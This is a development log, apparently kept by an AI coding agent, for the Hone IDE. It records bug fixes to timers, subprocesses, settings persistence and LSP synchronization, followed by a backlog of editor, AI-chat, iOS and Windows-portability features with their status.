**Iter 85 — title-stream timer/handle leaked forever on error (2026-05-16):** systematic `setInterval` cleanup audit. App-lifetime singletons (settings/telemetry/cursor/dirty/sync-version polls) don't leak (one instance, run-forever by design); `claudeRateLimitTimer` is defensively cleared at every relevant transition (verified). But `pollTitleStream` (background auto-title generation) gated its cleanup on `if (status === 2)` — DONE only. **Status 3 (ERROR) was unhandled**, so a failed title-generation request — a transient provider 429/500 or a network blip on the small title call specifically — left the 100ms `titleStreamTimer` interval AND the native stream handle dangling **permanently**. Unlike iters 82–84 this isn't a user-visible wedge (the chat keeps working, the title just doesn't update), but it's a genuine resource leak that *accumulates*: every session whose first message coincides with a transient title-call failure adds another forever-running 100ms timer + leaked stream handle. The main `pollStreamTick` already uses the correct `>= 2` (DONE or ERROR); the title path diverged with `=== 2`. Fixed to `>= 2`, matching the main-stream pattern — on error it now runs the same teardown (clear timer, streamClose, reset active); the pre-existing `titleAccumulated.length > 2` guard already prevents setting a junk partial title. Pure cleanup-path fix, no behavior change on the success path, no new strings. Build verifier-clean. The streaming/timer-robustness thread (iters 82–85) has now closed 3 silent/permanent chat breakages **and** 1 accumulating resource leak — every per-operation timer in the chat panel now has a guaranteed teardown on both success and error.

**Iter 86 — debug "Run File": Stop is a no-op + Run→Stop→Run multiplies orphan processes (2026-05-16):** carried the iter-84 process-leak lens to the debug panel. `debugStart()` runs the program via blocking `execSync(fullCmd)` on a Perry `spawn()` thread — `execSync` captures **no PID** and returns only when the child *exits on its own*. `debugStop()` merely set `debugRunning = 0` (and cleared the "Running…" status), implying the program stopped — but the child keeps running on the still-blocked execSync thread. The compounding bug: `debugStart`'s only guard was `if (debugRunning > 0) return`, which `debugStop` had just cleared — so **Run a server (`bun run dev`, `python app.py`, `cargo run`, a REPL) → Stop → Run again spawns a SECOND copy while the first is still alive**, and repeating accumulates unkillable orphan processes (often all fighting for the same port), each pinning a forever-blocked spawn thread. A program that never exits also blocks `onRunComplete` forever (output never finalizes). Same class as the iter-84 claude leak but user-triggered via a button explicitly labeled "Stop". Proper fix (capture PID via `spawnBackground` + poll a log file + `taskkill`/`kill` on stop — exactly the tasks-panel/claude pattern) is the spawnBackground rearchitecture #11 already scopes to v1.1. /loop-sized correct fix applied: added `_debugThreadInFlight` (set before `spawn()`, cleared ONLY in `onRunComplete` when the child truly exited, and deliberately **not** cleared by `debugStop`). `debugStart` now refuses with a clear message while a prior child is still alive — **eliminating the orphan-multiplication** (worst concrete harm) without the risky execSync rearchitecture. `debugStop` is now honest (matches #11 framing): it tells the user the program keeps running in the background and can't be force-killed in v1, instead of silently implying it stopped. 2 i18n strings (653→655). Net: at most one debug child can be alive at a time, and the Stop button no longer lies. Build verifier-clean.

**Iter 87 — terminal PTY-handle leak guard (defensive/latent, not an active bug) (2026-05-16):** carried the iter-84/86 process-leak lens to the terminal panel. `renderTerminalPanel` did `termHandle = hone_terminal_open(...)` with no close-if-already-open guard — if invoked while `termHandle !== 0` it would orphan the previous PTY's shell process (handle lost; `destroyTerminalPanel` can only close the *current* handle). **Honest assessment: this does not trigger today** — `renderTerminalPanel` has exactly one call site (startup), `toggleTerminalAction` only `widgetSetHidden`s (PTY correctly persists across hide/show — not a leak), `onFolderOpened` calls `setTerminalCwd` not a re-render, and theme changes route through `applyTerminalThemeColors` not a re-render. So it's a *latent* defensive gap, not an active defect. It's worth the 3-line guard anyway (not marginal noise) because it sits directly in the path of the planned #51 "multiple terminals + splits" work, which *will* add more open-calls; the guard (mirroring claude-process's stopClaudeSession-before-start pattern) makes that future expansion leak-safe by default rather than a latent regression waiting to happen. No new strings, no behavior change on the current single-call path. Build verifier-clean. **Calibration note for the loop record:** this iteration found a *latent* gap rather than an active bug — recorded as such (not overstated). It's the first non-active finding since the iters 82–86 streak of genuine defects; consistent with the diminishing-returns trend the iter-81 snapshot flagged. The subprocess/handle-lifecycle audit (iters 84–87: claude, title-stream, debug-run, terminal-PTY) is now comprehensive — every OS-process/handle-spawning path in the codebase has a verified or hardened open/close discipline.

**Iter 88 — settings flush could silently wipe the ENTIRE user config on a mid-write crash (2026-05-16):** back to an active defect (not latent like iter 87). `_flushSettingsToDisk` fires every 500ms and did a **direct non-atomic `writeFileSync(getSettingsPath(), serializeFromVars())`** of `~/.hone/settings.ini`. A crash / forced-quit / disk-full *during* that write truncates the file → on next launch the user loses **everything at once**: theme, fonts, keybindings file pointer, terminal shell, AI provider selection, telemetry consent, recent folders, last-open tabs, sync session, workspace-trust list. Same iters-62/67/71 file-corruption class but the highest blast radius yet (one write, total config loss). Compounding bug: `_settingsDirty = 0` was set *before* the write, so a transient write failure (disk full, EPERM) silently dropped that change and was never retried. Perry exposes no sync `rename` (only async `fs/promises.rename`), so a true atomic temp+rename isn't possible in the synchronous 500ms flush — but two achievable hardenings close the practical exposure: (1) **`.bak` written before the overwrite** — step A snapshots the current good `settings.ini` → `settings.ini.bak`, step B writes the live file; a crash in B leaves the prior-good `.bak` intact, and `initSettings` now falls back to `.bak` when `settings.ini` is missing/empty/truncated, bounding worst-case loss to the ≤500ms of changes since the last successful flush instead of the entire config; a crash in A leaves `settings.ini` untouched (no recovery needed). (2) **`_settingsDirty` cleared only after a successful write** — a failed flush now retries on the next tick instead of being lost. Both use only Perry's available sync primitives (readFileSync/writeFileSync/existsSync), no behavior change on the success path, no new strings. Build verifier-clean. This is the data-integrity sweep's central-config analogue — arguably its highest-blast-radius single fix after the iter-62 CRLF save (that corrupts one file; this wiped the user's whole configuration).

**Iter 89 — chat-session index: same non-atomic truncation + cache divergence (2026-05-16):** continued the persistence audit into `session-store.ts`. `writeIndex` did a non-atomic `writeFileSync(indexPath, content)` of `~/.hone/chats/index.txt` AND set `indexCache = content` *unconditionally* — even when the write threw, diverging the in-memory cache from disk. A crash during the index write (it fires on session create/delete/rename/timestamp-update) truncates the index → the chat sidebar shows **no past sessions even though every `<id>.txt` conversation file still exists on disk, with no in-app way to recover them**. Honest proportionality check (vs mechanically applying iter-88's pattern everywhere): this clears the bar — losing the navigable session list is real user-facing data-loss with no other recovery path, unlike e.g. the recent-files list which self-regenerates. Lower blast radius than iter-88 (the conversation content survives; write window is per-CRUD-op not a constant 500ms flush) but still warrants the tight fix. Applied the established pattern: `.bak` snapshot written before the overwrite; `readIndex` falls back to `.bak` when `index.txt` is missing/truncated/empty-from-failed-read (carefully NOT imposing a length floor — an empty index is a legit "no sessions yet" state; only a non-empty `.bak` overrides an empty read); `indexCache` updated only on a successful write so in-memory state matches what's actually recoverable. Used existing fs primitives, no new strings, success path unchanged. Build verifier-clean. Deliberately did NOT extend this to `recent-store` (the recent list self-regenerates from use — applying `.bak` there would be the mechanical over-application the iter-87 calibration note warned against). The non-atomic-persistence audit now covers the two paths where truncation causes irrecoverable user-facing loss (settings 88, chat index 89); the rest were assessed and correctly left alone.

**Iter 90 — regression-verification of the EOL/BOM/binary/truncation state machine (2026-05-16):** no code change — a deliberate, load-bearing audit. render.ts's most intricate accumulated change (the `_currentEol`/`_currentHadBOM`/`_currentFileIsBinary`/`_currentFileTruncated` state machine, touched across iters 60–88) is also where an accumulated regression would most likely hide, and an accumulated regression in the run's highest-value thread is the actual current risk (the ~60-file uncommitted diff is verifier-clean but not runtime-tested here). Enumerated all touch points and re-derived the invariant — *every non-virtual `displayFileContent` open must deterministically set all four flags so save (restoreEolForSave + binary/truncated guards) can never act on stale state from a previously-open file*. Verified: (a) non-binary open path sets all four with NO early-return between the binary check and the `_currentEol=detectEolStyle(body)` assignment (no stale-EOL leak); (b) the binary early-return block sets all four coherently incl. the iter-71 truncation reset; (c) `saveFileAction` guard order is binary→truncated→Save-As-redirect→write, so binary/truncated are refused before any Save-As bypass and untitled files (always fresh-empty) reset the flags; (d) the disk-reload path mirrors the open path; (e) the virtual-tab early-return correctly preserves flags matching the unchanged `currentEditorFilePath` (iter-66 reasoning re-confirmed under the later 70/71/88 additions). Walked the cross-file-switch edges (CRLF→binary→LF, truncated→small) — all flags reset, no leak. Conclusion: **the state machine is internally consistent across iters 60–88; no accumulated regression.** Recorded because a future reviewer deciding whether to commit the large diff needs to know the run's most complex change was rigorously re-validated as a whole, not just patched incrementally.

**Iter 91 — LSP `textDocument/didClose` never sent: server-side leak + stale diagnostics + spec violation (2026-05-16):** fresh subsystem audit (LSP document lifecycle) — refutes the iter-90 diminishing-returns read again with a genuine bug. lsp-bridge had `lspDidOpen`/`lspDidChange`/`lspDidSave` but **no `lspDidClose` at all**, and tab-close never notified the language server. Consequence: the server treats every file opened in the session as still-open *forever* — its in-memory program/AST model grows unbounded over a long editing session (server-side resource leak, the iter-84/88 class but in the LSP process), it keeps (re)publishing diagnostics for files no longer visible, and it violates the LSP spec (`textDocument/didClose` is required when a doc leaves the editor; some servers degrade without it). Added `lspDidClose(filePath)` mirroring `lspDidSave` (bare notification, same un-escaped `file://`+path convention as the existing three — kept consistent deliberately; URI-escaping is a separate cross-cutting concern for all four). Wired into `onBeforeTabCloseImpl` (fires on every tab close, has the path). **Self-caught secondary bug during implementation:** the naive placement (top of the function) would send didClose on the dirty-tab **cancel** path too (that branch also `return 1`s), telling the server a still-open doc was gone → broken diagnostics/hover/completion for the file the user chose to keep open. Restructured so didClose fires only where the close actually proceeds: the not-dirty branch, and the dirty branch *after* the cancel check. Virtual tabs (leading `_`) and empty paths are skipped (never `didOpen`'d → a didClose would be a spurious unknown-doc notification). Build verifier-clean. The dominant real-world leak (open many files, close one-by-one over a long same-workspace session) is exactly this path; closeAllOpenTabs/workspace-switch is bounded by the LSP server restart on re-root. No new strings.

**Iter 92 — LSP document version was a single global counter (per-doc monotonicity violation → server desync) (2026-05-16):** continued the LSP-correctness audit from iter-91's didClose into version tracking. `currentFileVersion` was **one global counter**: `lspDidOpen` set it to 1 and sent `"version":1`; `lspDidChange` did `currentFileVersion = currentFileVersion + 1`. The LSP spec requires version numbers monotonically increasing **per document**. Failure sequence: open A → didOpen A v1; edit A ×3 → didChange A v2,v3,v4; open B → `lspDidOpen` resets the global to 1; switch back and edit A → `lspDidChange` sends A "version 2" while the server last saw A at v4. A spec-compliant server requires the new version > its last for that doc, so it **rejects/ignores the change and its in-memory model of A diverges from the editor** — stale diagnostics, wrong completions/hover/signature-help on the file the user is *actively editing*, until something forces a full re-sync. Replaced with per-document tracking via Perry-safe parallel arrays (`_lspVerPaths`/`_lspVerNums`, mirroring the established fileCache pattern — no dynamic object-key access): `lspDidOpen`→`_lspVerReset` (that doc → 1), `lspDidChange`→`_lspVerBump` (that doc's own counter, with a fall-back-to-1 if a change ever precedes its open so we never desync), `lspDidClose`→`_lspVerDrop` (entry removed so a reopen restarts at v1 and the arrays stay bounded over a long session — integrates cleanly with the iter-91 didClose). Removed the now-dead `currentFileVersion` declaration (kept the explanatory comment that references it as the replaced approach). Build verifier-clean, no new strings. The LSP-lifecycle sub-audit (iters 91–92) has now closed both the missing-didClose leak and the global-version desync — the document sync protocol (open/change/save/close + versioning) is now spec-correct.

**Iter 93 — Problems panel & status count only ever showed the LAST-published file's diagnostics (multi-file projects effectively had no working Problems panel) (2026-05-16):** continuing the LSP-correctness audit (iters 91 didClose, 92 versioning) into the *receive* side. `handleDiagnosticsNotification` (lsp-bridge.ts) parsed each `textDocument/publishDiagnostics` and called `updateDiagnostics(files, lines, messages, severities, count)` — a **wholesale replace** of the entire panel state. But the LSP spec has the server publish diagnostics **per file**: tsgo / typescript-language-server stream one notification per file across the whole program. So with files A, B, C each having errors, the server sends 3 notifications and the panel ended up showing **only C's** — A's and B's silently vanished, and the panel visibly *flickered* as each notification clobbered the last during the initial project scan. Worse, the empty-clear branch called `updateDiagnostics([],[],[],[],0)` with **no file scope** — one clean file wiped *every* file's diagnostics from the panel. And the status-bar error/warning badge was computed from only that one notification's counts, so it showed e.g. "1 error" when the project had 12 across 5 files — actively misleading for the exact ship-blocker triage this panel exists to support. Fix: added `setFileDiagnostics(filePath, lines, messages, severities, count)` to diagnostics-panel.ts — a **per-file replace within the aggregate**: Perry-safe parallel-array rebuild that copies forward every existing entry whose file ≠ filePath (char-by-char compare, no regex/dynamic keys), then appends this file's new set (count may be 0 → that file is now clean, correctly scoped — every *other* file's diagnostics survive). Added project-wide `getDiagErrorCount()`/`getDiagWarningCount()` that scan the *whole* aggregate. Rewired lsp-bridge: the LSP path (both the populate and the now-scoped empty-clear) calls `setFileDiagnostics(filePath, …)`, and `callStatusUpdater` now reports project-wide totals via the new getters instead of one notification's counts. `updateDiagnostics` is deliberately **retained unchanged** as the whole-replace primitive for the no-LSP fallback-tsc path (lsp-bridge:~1350) — that caller emits the entire project's diagnostics in a single shot, so whole-replace is correct there; only the streaming-LSP callers needed the per-file primitive. Removed the now-dead per-entry `diagFiles` array from the parse loop (every entry in one publish belongs to the single derived `filePath`). Build verifier/codegen clean (only the known pre-existing `perry_runtime.lib` link-stage gap on this host), no new strings (internal aggregation, no user-facing text). The LSP sub-audit (iters 91–93) has now closed the document-lifecycle send side (didClose leak, per-doc versioning) **and** the diagnostics receive side — the Problems panel now correctly reflects the whole multi-file program, which is table-stakes for v1 ship triage.

### AI

59. **[P1] Markdown rendering misses tables, lists, blockquotes, link rendering, code-block inner-language highlighting.** `markdown-render.ts` (215 LOC) covers headers/fences/bullets/bold/inline-code only.
   - **Phase 6 done (2026-05-12):** `markdown-render.ts` now also handles ordered lists (`1. `…`999. `), blockquotes (`> text` rendered with `│` prefix in muted color), and pipe-delimited tables (`|a|b|c|`). Tables detect a separator row `|---|---|`, skip it, and render as monospace boxes — proper grid layout pending a perry/ui grid widget (v1.1). Link rendering as clickable widgets + code-block inner-language syntax highlighting both remain follow-ups.
   - **Phase 6 link follow-up done (2026-05-13):** `[label](url)` is now parsed inside `renderInlineText` and emitted as a borderless `Button` colored VS Code blue (`#3794FF` dark, `#0066CC` light). Click invokes new `openExternalUrl(url)` which routes per `__platform__`: macOS → `spawnSync('open', [url])`, Windows → `spawnSync('cmd', ['/c', 'start', '', url])` (the empty `""` is the title slot Windows requires for URLs starting with `"`), Linux → `spawnSync('xdg-open', [url])`. Mixed-segment messages (`See [docs](url) for the **bold** code \`example\``) still split correctly because the link parser is applied per prose-segment after backtick splitting. Stacked-not-inline layout is the same pre-existing limitation as inline code — needs a real flow-layout widget in perry/ui to fix. Code-block inner-language highlighting still needs the tree-sitter engine wired into the chat renderer (composite-engine call already exists in the editor; reusing it here requires plumbing `EditorTheme` through chat-panel) — v1.1.
60. **[P1] Diff preview before agent edits.** `file_edit` runs immediately on approval. Done: show diff card with apply/reject before write.
61. **[P1] @-mention completion in chat input.** Spec calls for files/symbols/folders/web. Currently context chips only (capped at 8). Done: trigger autocomplete on `@`.
   - **Phase 6 done (2026-05-13):** `onChatInput` looks at the substring after the last whitespace; if it starts with `@`, the rest is the query. A new `mentionsContainer` VStack sits between the bottom bar and the chat input, hidden by default. On each `@`-prefixed keystroke, `showMentionsPopup(query)` lazily builds a workspace file index (`readdirSync` walk capped at depth-8 / 5000 entries; skips `.*`, `node_modules`, `dist`, `target`), then ranks substring matches with basename-prefix matches first. Up to 8 results rendered as borderless buttons. Click → `insertMention(rel)` replaces the trailing `@<query>` in `chatInputText` with `@<rel> ` via `textfieldSetString`, focuses the input, and hides the popup. Symbol (`@<symbol>`), folder, and web mentions deferred to v1.1 — they need either the LSP workspace-symbol cache (already wired via #31) and folder-only enumeration, or a real web search provider.
62. **[P1] Slash commands in chat (`/fix`, `/explain`, `/test`).** `code-actions.ts` builds prompts but nothing invokes them from chat input.
   - **Phase 6 done (2026-05-13):** `expandSlashCommand` in `chat-panel.ts` intercepts five commands at submit time — `/fix`, `/explain`, `/test`, `/refactor`, `/doc` — and expands each into a fully-formed prompt that mentions the current file. Anything not in the set passes through unchanged. Remainder text after the command is folded in (e.g. `/explain why is this loop O(n²)` → "Explain why is this loop O(n²). Focus on intent, not syntax. …"). Adding new commands is a one-arm extension to the `if (cmd === '...')` chain.
63. **[P1] Generate commit message.** Standard Copilot feature.
   - **Phase 6 done (2026-05-12):** "Generate" button next to Commit in the git panel. Click reads `git diff --cached` (falls back to working-tree diff), assembles a conventional-commit prompt with the file summary + capped patch body (6KB cap), switches the right panel to AI Chat, pre-fills the input via the new `prefillChatInput` export, and surfaces a notification. User reviews + Enter to submit through the chat's existing streaming flow. Direct injection back into the commit field is v1.1 polish (avoids re-implementing SSE streaming in the git panel).

### iOS / iPad / Sync

64. **[P1] iOS keyboard handling.** No `keyboardWillShow` / `resignFirstResponder` references. Editor obscured when keyboard appears. Done: insets and scroll-to-cursor on keyboard show, dismiss on tap-outside.
65. **[P1] iOS app lifecycle.** `onAppBackground`/`onAppForeground` exported (`sync-guest.ts:611-637`) but never invoked. Backgrounding drops WS with no recovery. Done: bridge from perry-ui-ios SceneDelegate.
66. **[P1] Auto-reconnect orchestrator orphaned.** `shouldReconnect` / `markReconnectAttempt` / `getReconnectDelay` (`sync-guest.ts:262-281`) have no caller.
   - **Phase 7 done (2026-05-12):** wired through render.ts. `onRelayDisconnectedImpl` now: checks `shouldReconnect()` (respects max-attempt cap + active room + enable flag), marks the attempt, and uses `getReconnectDelay()` (exponential backoff with jitter, capped at 30s) for the retry timer — replacing the hardcoded 2s. `onRelayConnectedImpl` calls `resetReconnectAttempts()` on successful (re)connect. `setReconnectEnabled(1)` fires at sync init.
67. **[P1] QR rendering on Mac.** Spec calls for 180×180 QR; zero references to `CIFilter` / `qrcode` anywhere. Done: generate QR via CIFilter FFI in `sync-panel`.
68. **[P1] QR scanning on iOS.** No `AVCaptureSession`, no camera FFI. Done: scanner sheet via `AVCaptureMetadataOutput`.
69. **[P1] iPad orientation change listener.** `perry_on_layout_change` only wired for web. Rotating an iPad doesn't relayout.
   - **Phase 7 TS-side done (2026-05-12):** `platform.ts::installNativeListeners` now installs the `perry_on_layout_change` callback for iOS / iPadOS (platform id 1) in addition to web. When perry-ui-ios's stub implements the FFI hook (currently a no-op per memory), the TS side already responds — no further change in `hone-ide` needed. The Rust-side bridge from UIScene `traitCollectionDidChange:` to the callback lives in `../perry/crates/perry-ui-ios/src/app.rs` and is the v1.1 follow-up.
70. **[P1] Bottom toolbar missing Git icon.** Spec is Files/Search/Git/Chat/Settings; current is Files/Search/AI/Sync/Settings (`render.ts:2755-2759`).
   - **Phase 7 done (2026-05-12):** `renderBottomToolbar` swaps Sync for Git (`arrow.triangle.branch` icon), matching spec. Sync lives in Settings panel — it's an enable/configure toggle, not a daily navigation target. New `onBottomBarGit()` handler routes to activity index 2 (Source Control).

---

## P2 — Important quality gaps

### Editor

71. **[P2] Auto-save (after delay / focus change / window change).** Not implemented.
   - **Phase 2 done (2026-05-13):** `checkAutoSave(currentLen)` runs on the 500ms dirty-poll tick. When the active tab is dirty, content length unchanged across N consecutive ticks (N = ceil(`filesAutoSaveDelay`/500)), and `filesAutoSave` setting is `'afterDelay'`, fires `saveFileAction()`. Settings default to off; users opt in via Settings → Files → Auto Save. `onFocusChange` / `onWindowChange` modes need Perry window-focus FFI — queued for v1.1.
72. **[P2] Trim trailing whitespace on save.**
   - **Phase 3 done (2026-05-13 — verified existing):** `saveFileAction` (`render.ts:559`) already runs `inlineTrimTrailingWhitespace(content)` when `filesTrimTrailingWhitespace` setting is on; `editorTrimFinalNewlines` + `editorInsertFinalNewline` also handled in the save-format block. Was implemented as part of an earlier save-format pass but not marked. Verified active.
73. **[P2] EOL conversion + encoding picker.** Detection works (`core/document/encoding.ts`), status bar shows static `'UTF-8'`. Done: clickable status items.
   - **Phase 3 done (2026-05-13):** new `updateStatusBarEol(label)` + `updateStatusBarEncoding(label)` exports in `status-bar.ts` push detected values to the existing buttons. Render's file-open path now calls `detectEolStyle(content)` (counts `\r\n` vs `\n`; majority wins) and `detectEncoding(content)` (checks for U+FEFF BOM at offset 0 → `UTF-8 BOM`, else `UTF-8`) — both pure-TS, no platform paths. Click on the EOL button cycles LF ↔ CRLF: walks the editor buffer, rewrites every `\r\n` pair to `\n` or vice versa (idempotent — adjacent `\r\n` already present is skipped), pushes the new content via `editor.setContent`, re-labels the button, and surfaces a notification. Encoding click stays as a display-only "conversion in v1.1" hint — mid-file encoding swap is data-destructive and needs a confirm dialog perry/ui doesn't expose yet.
74. **[P2] Word wrap modes.** `native/word-wrap.ts` exists but isn't wired into the Rust editor view.
75. **[P2] Whitespace rendering (boundary/all/selection).**
76. **[P2] Render control characters.**
77. **[P2] Line numbers: relative / interval modes.**
78. **[P2] Vertical rulers.**
79. **[P2] Smooth scrolling + smooth cursor animation.** Rust shifts y_offsets directly — no animation.
80. **[P2] Multi-cursor: Cmd+Click; Cmd+Shift+L (add all matches); column/box selection (Alt+drag).** Done: `editor.action.addCursorAtPosition` was already wired (powers Cmd+Click when Rust passes through cursor coords). `editor.action.selectAllOccurrences` was already wired (powers Cmd+Shift+L). Added `cursorManager.setColumnSelection(startLine, startCol, endLine, endCol)` + `editor.action.setColumnSelection` command for Alt+drag callers — fans one cursor per line in the range, clamps short lines, zero-width selections still produce cursors. 3 new tests (39 cursor tests passing). The Rust mouse-tracker for Cmd+Click / Alt+drag invokes these primitives; that handler is v1.1 polish.
81. **[P2] In-selection search scope.** `SearchOptions` doesn't expose it. Done: added `scopeStartLine` / `scopeEndLine` (1-based, inclusive) to `SearchOptions`. `searchFileContent` clamps its iteration to the scope; invalid ranges (missing/zero start or `end < start`) silently fall back to whole-document search. 4 new tests in `hone-core/tests/search.test.ts` (57/57 passing).
82. **[P2] Multi-file find/replace with include/exclude globs + preview.** Done: two new TextFields ("files to include" / "files to exclude") in the search panel; comma-separated patterns support `*.ext` (suffix), `dist/` (prefix-on-path), `**/foo` and bare names (substring). `matchesAnyPattern` + `passesGlobFilter` gate `collectSearchFiles`'s push. Replace flow already operates over filtered results, so include/exclude applies to it too. Preview / dry-run is still v1.1.
83. **[P2] Snippets: transforms (`${1/re/sub/}`), choices (`${1|a,b|}`), nested, library import.** Done: snippet engine now parses choices into `TabStop.choices` (pre-fills first option), transforms into `TabStop.transform = {regex,sub,flags}` (renderer applies post-input), and recursively expands `${1:default-with-${2:nested}}` placeholders with re-anchored offsets. New `hone-editor/tests/snippets.test.ts` (6 tests passing). Library import is still v1.1 — manifest format TBD.
84. **[P2] Outline view panel.** Depends on `documentSymbol`.
   - **Phase 2 done (2026-05-12):** `hone-ide/src/workbench/views/outline/outline-panel.ts` (~240 LOC). Registers `setDocumentSymbolsCallback`; parses LSP DocumentSymbol/SymbolInformation JSON; renders tree-indented list with SymbolKind badges; click jumps to symbol via `setOutlineJumpHandler`. Wiring into the sidebar layout + auto-refresh on tab change is a follow-up.
85. **[P2] Timeline / local history view.**
   - **Phase 3 done (2026-05-13):** new `views/timeline/timeline-panel.ts` (~190 LOC). Sidebar-takeover pattern like references-peek / outline. `renderTimelinePanel(parent, colors)` mounts the panel; `setTimelineActiveFile(filePath)` swaps content and triggers `git log --follow -n 50 --format=%h|%an|%ar|%s -- <relpath>` (argv-form, Windows-safe). Each row shows hash + age + author on a metadata line and the subject as a clickable button — click copies the short hash to the clipboard via `clipboardWrite` so the user can paste it into a terminal `git show` or feed it elsewhere. New `view.timeline` command (palette + native menu dispatch on length-13 `'v','t'` charCodeAt branch) + `showTimelineAction()` export. `displayFileContent` calls `setTimelineActiveFile` alongside the existing `setOutlineActiveFile` so the panel always reflects the active tab. Per-revision diff view (clicking a row to open a side-by-side diff against working tree) deferred to v1.1 — needs a new `openDiffForRevision(hash, path)` tab type the diff-view module doesn't expose yet.
86. **[P2] File watchers reconcile-on-disk-change in editor doc.** Done: hash-based reconciliation on the existing `pollDirtyState` (2s cadence — every 4 ticks of the 500ms dirty poll). `_externalFileHash` is seeded on file open and on save (djb2 over the just-read/just-written content). Disk reads only happen for the active tab; matches return early. Mismatch on a clean tab silently reloads + notifies; mismatch on a dirty tab raises a "changed on disk while you have unsaved edits" warning and adopts the new hash so notifications don't repeat every 2s. No stat FFI dependency — works on any platform with readFileSync.
87. **[P2] Region-marker folding (`//#region`).** Done: new `computeRegionFoldRanges(buffer)` scans for `#region` / `#endregion` markers (any comment prefix), pairs them with a LIFO stack so nested regions work, and drops unmatched starts/ends. `computeFoldRanges` now concatenates region ranges with the existing syntax/indent ranges. 5 new tests in `hone-editor/tests/folding.test.ts` (17/17 passing).

### Workbench / UX

88. **[P2] Right-click menus on editor, status bar, panels.** Currently only tabs + explorer. Done: editor menu was already wired in Phase 3 (Cut/Copy/Paste, Find, Replace, Go to Def, Find Refs, Rename, Quick Fix, Format). Added status-bar menu (Settings / Source Control / Copy Branch Name / Copy File Path via `clipboardWrite`), activity-bar menu (Settings / Toggle Sidebar), and sidebar menu (Hide / Move Right). Helpers `toggleSidebarLocation`, `copyBranchNameToClipboard`, `copyEditorPathToClipboard` added.
   - **Phase 3 done (2026-05-12):** editor context menu expanded from 2 items (Format Document, Go to Definition) to 9: Cut / Copy / Paste, Find… / Replace…, Go to Definition / Find All References / Rename Symbol… / Quick Fix…, Format Document. The four LSP-backed items use the Phase 2 wired requests (`lspReferences`, `lspRename`, `lspCodeActions`) and surface results via notifications for v1; `promptForRename` uses an argv-safe `osascript` text dialog to capture the new name. Status-bar and panel context menus still TODO.
89. **[P2] Tooltips with shortcuts on activity bar / icons / toolbar.** Done: imported `widgetSetTooltip` from perry/ui (already exposed in `widgets/mod.rs::set_tooltip`). Wired on all 6 desktop activity buttons + settings gear (Mac uses ⌘/⇧/⌃ glyphs, other platforms use "Ctrl+/Shift+/Alt+"); compact iPhone/landscape bar gets plain label tooltips. AppKit's `NSView.setToolTip` handles VoiceOver + a11y automatically.
90. **[P2] Empty states for Search / Git / Debug / Extensions panels.** Done: audited each panel. Search now reads "Type to search across files"; Git's "no repo" empty-state gets an inline "Initialize Repository" button that runs `git init` via the new `gitInitRepo()` helper (with spinner); Git's "clean tree" state explains *why* it's clean with a hint line. Debug already shows "No output" via `updateOutputUI`. Extensions panel always lists builtins so has no zero state.
91. **[P2] Confirm dialog on closing dirty tab.** Currently `closeActiveTab` just closes.
   - **Phase 3 done (2026-05-12):** added `setOnBeforeTabClose(fn)`, `forceCloseTab(idx)`, `isTabDirty(idx)` exports to `views/tabs/tab-bar.ts`. `onTabClose` invokes the guard synchronously *before* deferring — host returns `1` to cancel. Render.ts registers `onBeforeTabCloseImpl` which checks `isTabDirty(idx)`, then runs `promptCloseDirtyTab(path)` via `spawnSync('osascript', ['-e', script])` (argv-array, never a shell — escapes user-controlled filename through `escapeAppleScriptString`). Native `display dialog` returns Save (0) / Don't Save (1) / Cancel (2); Save+active calls `saveFileAction()` first, Don't Save discards, then `forceCloseTab(idx)` runs on next tick. Falls back to discard when osascript is unavailable (iOS sandbox).
   - **Windows portability (2026-05-13):** split `promptCloseDirtyTab` and `promptForRename` (used by #28/#88) into per-platform branches. macOS still uses `osascript display dialog`. Windows now uses `powershell.exe -NoProfile -NonInteractive -Command` to load `System.Windows.Forms` and show a YesNoCancel `MessageBox` (or `Microsoft.VisualBasic.Interaction.InputBox` for rename). Output streamed via `[Console]::Out.Write` so we get a clean stdout we can parse. iOS / Linux / web fall back to Save (safer than silent discard). Followup §5 called this out as the highest-value Windows-portability fix — the activity bar / sidebar / git panel had stayed argv-form and clipboard-portable, but the dirty-close dialog was a hard Mac dependency.
   - **Explorer file ops portability (2026-05-13):** the same Mac-only shell-out pattern was duplicated in `views/explorer/context-menu.ts` (file create, folder create, rename, delete, reveal-in-Finder, clipboard copy) and `views/ai-chat/chat-panel.ts::promptForSessionTitle` (#110). All five paths now branch on `__platform__`: shared `promptInputCrossPlatform` + `confirmCrossPlatform` helpers route to AppleScript on Mac / PowerShell `InputBox`+`MessageBox` on Windows. Mv/rm replaced with argv-form `spawnSync('mv', [src, dst])` (Unix) or `spawnSync('cmd', ['/c', 'move', '/Y', src, dst])` (Win) — no more `/tmp/hone_*.tmp` files, no more `mv "$(cat ...)"` shell tricks. Reveal-in-folder uses `open -R` (Mac), `explorer /select,<path>` (Win), `xdg-open <parent>` (Linux). Clipboard copy now uses `clipboardWrite` from perry/ui (already cross-platform). Old `parseDialogResult` helper deleted — was tied to AppleScript output format.
   - **Process management + temp paths portability (2026-05-13):** four more POSIX-only daily-use paths fixed. (a) `which X` lookups (`lsp-bridge.ts::onLspDiscoverTypeScript`, `render.ts` Claude Code detection) replaced with `findExecutableOnPath(name)` helper that branches to `where` on Windows / `which` elsewhere. Means LSP and Claude Code now auto-detect on Windows. (b) `execSync('kill <pid>')` calls in `render.ts::startClaudeForRelay`, `render.ts::cleanupClaudeRelay`, and `claude-process.ts::stopClaudeSession` swapped for argv-form `taskkill /F /PID <pid>` (Win) or `kill <pid>` (Unix) — Claude Code processes no longer leak as zombies on Windows. (c) `execSync('kill -0 <pid>')` liveness check in `chat-panel.ts` swapped for `tasklist /FI 'PID eq <pid>' /NH` on Windows (status non-zero OR `INFO:` prefix → gone). (d) `paths.ts::getTempDir()` now honors `$env:TEMP` / `$env:TMP` on Windows (falls back to `~/AppData/Local/Temp`); `render.ts::displayFileContent` and `openFileInEditor` route their timing-log writes through `getTempDir()` so debug logs land in a writable path on Windows. Net effect: opening files, attaching the LSP, and using Claude Code subprocesses all work on Windows without dropping back to manual configuration.
   - **Background-shell spawn portability (2026-05-14):** caught three more sites using `spawnBackground('/bin/sh', ['-c', cmd], '/dev/null')` to start long-running shell commands — `render.ts::startClaudeForRelay`, `claude-process.ts::startClaudeSession`, and `lsp-bridge.ts::runFallbackTsDiag`. All three now branch per `__platform__`: Windows uses `cmd.exe /c` + `NUL` as the null-device, Unix keeps `/bin/sh -c` + `/dev/null`. The TSC fallback diagnostic also needed the `touch` → `type nul >` substitution and `cd` → `cd /d` for cmd compatibility. Without these, Claude Code chat + npx-tsc fallback diagnostics would silently fail to spawn on Windows.
